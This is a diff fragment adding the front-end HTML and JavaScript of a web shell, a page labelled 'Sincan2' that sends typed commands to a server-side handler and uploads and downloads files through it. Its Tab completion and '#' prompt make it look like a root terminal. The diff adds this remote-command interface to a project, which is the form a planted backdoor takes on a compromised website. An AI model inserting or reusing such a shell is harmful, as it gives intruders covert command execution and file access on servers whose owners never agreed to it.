+                if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
+                    featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
+                } else if (/^\s*clear\s*$/.test(command)) {
+                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
+                    eShellContent.innerHTML = '';
+                } else {
+                    makeRequest("?feature=shell", {cmd: command, cwd: CWD}, function (response) {
+                        if (response.hasOwnProperty('file')) {
+                            featureDownload(atob(response.name), response.file)
+                        } else {
+                            _insertStdout(atob(response.stdout));
+                            updateCwd(atob(response.cwd));
+                        }
+                    });
+                }
+            }
+
+            function featureHint() {
+                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete
+
+                function _requestCallback(data) {
+                    if (data.files.length <= 1) return;  // no completion
+                    data.files = data.files.map(function(file){
+                        return atob(file);
+                    });
+                    if (data.files.length === 2) {
+                        if (type === 'cmd') {
+                            eShellCmdInput.value = data.files[0];
+                        } else {
+                            var currentValue = eShellCmdInput.value;
+                            eShellCmdInput.value = currentValue.replace(/([^\s]*)$/, data.files[0]);
+                        }
+                    } else {
+                        _insertCommand(eShellCmdInput.value);
+                        _insertStdout(data.files.join("\n"));
+                    }
+                }
+
+                var currentCmd = eShellCmdInput.value.split(" ");
+                var type = (currentCmd.length === 1) ? "cmd" : "file";
+                var fileName = (type === "cmd") ? currentCmd[0] : currentCmd[currentCmd.length - 1];
+
+                makeRequest(
+                    "?feature=hint",
+                    {
+                        filename: fileName,
+                        cwd: CWD,
+                        type: type
+                    },
+                    _requestCallback
+                );
+
+            }
+
+            function featureDownload(name, file) {
+                var element = document.createElement('a');
+                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);
+                element.setAttribute('download', name);
+                element.style.display = 'none';
+                document.body.appendChild(element);
+                element.click();
+                document.body.removeChild(element);
+                _insertStdout('Done.');
+            }
+
+            function featureUpload(path) {
+                var element = document.createElement('input');
+                element.setAttribute('type', 'file');
+                element.style.display = 'none';
+                document.body.appendChild(element);
+                element.addEventListener('change', function () {
+                    var promise = getBase64(element.files[0]);
+                    promise.then(function (file) {
+                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {
+                            _insertStdout(atob(response.stdout));
+                            updateCwd(atob(response.cwd));
+                        });
+                    }, function () {
+                        _insertStdout('An unknown client-side error occurred.');
+                    });
+                });
+                element.click();
+                document.body.removeChild(element);
+            }
+
+            function getBase64(file, onLoadCallback) {
+                return new Promise(function(resolve, reject) {
+                    var reader = new FileReader();
+                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };
+                    reader.onerror = reject;
+                    reader.readAsDataURL(file);
+                });
+            }
+
+            function genPrompt(cwd) {
+                cwd = cwd || "~";
+                var shortCwd = cwd;
+                if (cwd.split("/").length > 3) {
+                    var splittedCwd = cwd.split("/");
+                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
+                }
+                return SHELL_CONFIG["username"] + "@" + SHELL_CONFIG["hostname"] + ":<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
+            }
+
+            function updateCwd(cwd) {
+                if (cwd) {
+                    CWD = cwd;
+                    _updatePrompt();
+                    return;
+                }
+                makeRequest("?feature=pwd", {}, function(response) {
+                    CWD = atob(response.cwd);
+                    _updatePrompt();
+                });
+
+            }
+
+            function escapeHtml(string) {
+                return string
+                    .replace(/&/g, "&amp;")
+                    .replace(/</g, "&lt;")
+                    .replace(/>/g, "&gt;");
+            }
+
+            function _updatePrompt() {
+                var eShellPrompt = document.getElementById("shell-prompt");
+                eShellPrompt.innerHTML = genPrompt(CWD);
+            }
+
+            function _onShellCmdKeyDown(event) {
+                switch (event.key) {
+                    case "Enter":
+                        featureShell(eShellCmdInput.value);
+                        insertToHistory(eShellCmdInput.value);
+                        eShellCmdInput.value = "";
+                        break;
+                    case "ArrowUp":
+                        if (historyPosition > 0) {
+                            historyPosition--;
+                            eShellCmdInput.blur();
+                            eShellCmdInput.value = commandHistory[historyPosition];
+                            _defer(function() {
+                                eShellCmdInput.focus();
+                            });
+                        }
+                        break;
+                    case "ArrowDown":
+                        if (historyPosition >= commandHistory.length) {
+                            break;
+                        }
+                        historyPosition++;
+                        if (historyPosition === commandHistory.length) {
+                            eShellCmdInput.value = "";
+                        } else {
+                            eShellCmdInput.blur();
+                            eShellCmdInput.focus();
+                            eShellCmdInput.value = commandHistory[historyPosition];
+                        }
+                        break;
+                    case 'Tab':
+                        event.preventDefault();
+                        featureHint();
+                        break;
+                }
+            }
+
+            function insertToHistory(cmd) {
+                commandHistory.push(cmd);
+                historyPosition = commandHistory.length;
+            }
+
+            function makeRequest(url, params, callback) {
+                function getQueryString() {
+                    var a = [];
+                    for (var key in params) {
+                        if (params.hasOwnProperty(key)) {
+                            a.push(encodeURIComponent(key) + "=" + encodeURIComponent(params[key]));
+                        }
+                    }
+                    return a.join("&");
+                }
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", url, true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4 && xhr.status === 200) {
+                        try {
+                            var responseJson = JSON.parse(xhr.responseText);
+                            callback(responseJson);
+                        } catch (error) {
+                            alert("Error while parsing response: " + error);
+                        }
+                    }
+                };
+                xhr.send(getQueryString());
+            }
+
+            document.onclick = function(event) {
+                event = event || window.event;
+                var selection = window.getSelection();
+                var target = event.target || event.srcElement;
+
+                if (target.tagName === "SELECT") {
+                    return;
+                }
+
+                if (!selection.toString()) {
+                    eShellCmdInput.focus();
+                }
+            };
+
+            window.onload = function() {
+                eShellCmdInput = document.getElementById("shell-cmd");
+                eShellContent = document.getElementById("shell-content");
+                updateCwd();
+                eShellCmdInput.focus();
+            };
+        </script>
+    </head>
+
+    <body>
+        <div id="shell">
+            <pre id="shell-content">
+                <div id="shell-logo">
+
+Sincan2                                 <span></span>
+                </div>
+            </pre>
+            <div id="shell-input">
+                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
+                <div>
+                    <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
+                </div>
+            </div>
+        </div>
+    </body>
+
+</html>
